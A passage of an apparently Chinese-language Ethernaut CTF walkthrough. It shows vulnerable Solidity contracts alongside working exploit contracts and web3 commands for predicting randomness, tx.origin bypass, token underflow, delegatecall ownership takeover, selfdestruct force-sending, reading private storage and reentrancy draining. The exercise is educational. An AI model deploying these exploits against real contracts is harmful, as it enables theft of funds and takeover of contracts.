class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要是随机数安全，但是区块链上所有的数据都是公开的，源码中的</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ui<span class="symbol">nt256</span> blockValue = ui<span class="symbol">nt256</span><span class="comment">(blockhash(block.number.sub(1)</span>));</span><br></pre></td></tr></table></figure>
<p>可以通过</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256(blockhash(<span class="keyword">block</span>.<span class="keyword">number</span> -<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>获得</p>
<p>编写EXP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Exp&#123;</span><br><span class="line">    address public con_addr = <span class="number">0xcf3Ba6B0681183999D8D053fD7F4E4Fa3340A524</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成合约的地址</span></span><br><span class="line">    CoinFlip c = CoinFlip(con_addr);</span><br><span class="line">    uint256 public FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">guess</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number -<span class="number">1</span>));</span><br><span class="line">        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">        bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">        c.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本来想写个for循环，编译器提示我gas不足，会导致交易失败，就不了了之</p>
<p>连续点击十次guess</p>
<p><img src="/2021/06/17/16/image-20210617054852440.png" alt="image-20210617054852440"></p>
<p><img src="/2021/06/17/16/image-20210617054951941.png" alt="image-20210617054951941"></p>
<p>网上找到了一个POC</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> blockHash = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(</span><br><span class="line">    (resolve, reject) =&gt; web3.eth.getBlock(<span class="string">&#x27;latest&#x27;</span>, <span class="function">(<span class="params">error, result</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(!error)</span><br><span class="line">          resolve(result[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          reject(error);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line">contract.flip(<span class="built_in">parseInt</span>((<span class="keyword">await</span> blockHash())[<span class="number">2</span>], <span class="number">16</span>) &gt; <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<p>果然太牛了</p>
<h2 id="0x05-Telephone"><a href="#0x05-Telephone" class="headerlink" title="0x05 Telephone"></a>0x05 Telephone</h2><p>考察msg.sender与tx.origin不相同</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>部署合约EXP调用Telephone即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Exp&#123;</span><br><span class="line">    </span><br><span class="line">    address public con_addr = <span class="number">0x285c2fd96e1582de7fcB314C9e0048B76089936e</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成合约的地址</span></span><br><span class="line">    address public _owner = <span class="number">0xe510Ac7b174D055679d38450c42AD07bC65E0bc9</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成自己的地址</span></span><br><span class="line">    Telephone phone = Telephone(con_addr);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        phone.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617060301242.png" alt="image-20210617060301242"></p>
<h2 id="0x06-Token"><a href="#0x06-Token" class="headerlink" title="0x06 Token"></a>0x06 Token</h2><p>整数乘法溢出</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Exp&#123;</span><br><span class="line">    </span><br><span class="line">    address public con_addr = <span class="number">0xf920AeFe3343D3C8dd9BC4a360e814470300c344</span>;</span><br><span class="line">    <span class="comment">// 这个地址改成合约的地址</span></span><br><span class="line">    address public _owner = <span class="number">0x63C2F14860D68d75dc2837DBD0D0845294291738</span>;</span><br><span class="line">    <span class="comment">// 随意填写一个地址</span></span><br><span class="line">    uint overvalue = <span class="number">21</span>;</span><br><span class="line">    Token token = Token(con_addr);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        token.transfer(_owner,overvalue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617061736552.png" alt="image-20210617061736552"></p>
<h2 id="0x07-Delegation"><a href="#0x07-Delegation" class="headerlink" title="0x07 Delegation"></a>0x07 Delegation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _owner</span>) <span class="title">public</span> &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">      <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>Delegation</code>调用了<code>Delegate</code>合约,在其<code>fallback</code>函数中 使用了<code>delegatecall</code></p>
<p>考点在于 Solidity 中支持两种底层调用方式 <code>call</code>和 <code>delegatecall</code></p>
<blockquote>
<p>call 外部调用时，上下文是外部合约 delegatecall 外部调用时，上下文是调用合约</p>
</blockquote>
<p>也就是说通过<code>address(delegate).delegatecall(msg.data);</code>我们能调用<code>delegate</code>的任意函数</p>
<p>这里我们发现只要调用<code>delegate</code>的<code>pwn()</code>函数就好了</p>
<p>在solidty中可以通过method id（函数选择器）来调用函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: web3.utils.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;)<span class="comment">//0xdd365b8b</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617150646354.png" alt></p>
<p><img src="/2021/06/17/16/image-20210617063916725.png" alt="image-20210617063916725"></p>
<h2 id="0X08-Force"><a href="#0X08-Force" class="headerlink" title="0X08 Force"></a>0X08 Force</h2><p>The goal of this level is to make the balance of the contract greater than zero.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
<p>要求合约余额大于零，先试试直接转账</p>
<p><img src="/2021/06/17/16/image-20210617151434286.png" alt="image-20210617151434286"></p>
<p>去反编译看代码，啥也没有，fallback没有payable</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        memory[<span class="number">0x40</span>:<span class="number">0x60</span>] = <span class="number">0x80</span>;</span><br><span class="line">        revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后想到用合约销毁强制转账的方式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract exp&#123; </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exp</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params">address _target</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_target);</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>记得部署的时候打点钱，或者后面转也可以</p>
<p><img src="/2021/06/17/16/image-20210617153930963.png" alt="image-20210617153930963"></p>
<h2 id="0x09-Vault"><a href="#0x09-Vault" class="headerlink" title="0x09 Vault"></a>0x09 Vault</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义为私有变量只能组织其他合约访问，但是无法阻止公开访问</p>
<p>按照其代码，可以知道password的存储位置是1</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">web3</span><span class="selector-class">.eth</span><span class="selector-class">.getStorageAt</span>(<span class="selector-tag">contract</span><span class="selector-class">.address</span>, 1)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617154923739.png" alt="image-20210617154923739"></p>
<p><img src="/2021/06/17/16/image-20210617155309438.png" alt="image-20210617155309438"></p>
<p>直接使用</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.unlock(<span class="string">&quot;A very strong secret password :\)&quot;</span>)<span class="regexp">//</span>密码错误</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">contract</span>.unlock(web<span class="number">3</span>.utils.hexToBytes(&#x27;<span class="number">0</span>x<span class="number">412076657279207374726</span>f<span class="number">6</span>e<span class="number">67207365637265742070617373776</span>f<span class="number">7264203</span>a<span class="number">29</span>&#x27;))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617161012697.png" alt="image-20210617161012697"></p>
<h2 id="0x0A-King"><a href="#0x0A-King" class="headerlink" title="0x0A King"></a>0x0A King</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_king</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address payable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p>
<p><img src="/2021/06/17/16/image-20210617162135418.png" alt="image-20210617162135418"></p>
<p>此时King是别人</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address target</span>) <span class="title">public</span> <span class="title">payable</span>&#123;</span><br><span class="line">        target.call.gas(<span class="number">1000000</span>).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给合约转一些钱，是自己成为King，同时不接受退款</p>
<p><img src="/2021/06/17/16/image-20210617170057604.png" alt="image-20210617170057604"></p>
<p><img src="/2021/06/17/16/image-20210617172756652.png" alt="image-20210617172756652"></p>
<p><img src="/2021/06/17/16/image-20210617172746510.png" alt="image-20210617172746510"></p>
<h2 id="0x0B-Re-entrancy"><a href="#0x0B-Re-entrancy" class="headerlink" title="0x0B Re-entrancy"></a>0x0B Re-entrancy</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result, bytes memory data) = msg.sender.call.value(_amount)(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract Reenter &#123;</span><br><span class="line">    Reentrance reentranceContract;</span><br><span class="line">    uint public amount = <span class="number">1</span> ether;    <span class="comment">//withdrawal amount</span></span><br><span class="line">     </span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address payable reentranceContactAddress</span>) <span class="title">public</span> <span class="title">payable</span> &#123;</span><br><span class="line">        reentranceContract = Reentrance(reentranceContactAddress);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initiateAttack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    reentranceContract.donate&#123;<span class="attr">value</span>:amount&#125;(address(<span class="built_in">this</span>));</span><br><span class="line">    <span class="comment">//首先,需要捐赠一些钱</span></span><br><span class="line">    reentranceContract.withdraw(amount);</span><br><span class="line">    <span class="comment">//然后调用合约的withdraw函数提现</span></span><br><span class="line">  &#125;</span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    <span class="keyword">if</span> (address(reentranceContract).balance &gt;= <span class="number">0</span> ) &#123;</span><br><span class="line">        reentranceContract.withdraw(amount); </span><br><span class="line">    &#125;<span class="comment">//因为我们接受以太币的时候也会调用我们的回退函数</span></span><br><span class="line">     <span class="comment">//而我们的回退函数中又一次调用了题目合约的withdraw函数</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210617180356753.png" alt="image-20210617180356753"></p>
<p><img src="/2021/06/17/16/image-20210617180252026.png" alt="image-20210617180356753"></p>
<h2 id="0x0C-Elevator"><a href="#0x0C-Elevator" class="headerlink" title="0x0C Elevator"></a>0x0C Elevator</h2><p>直接甩给我们一个可控的接口，题目目标是登顶</p>
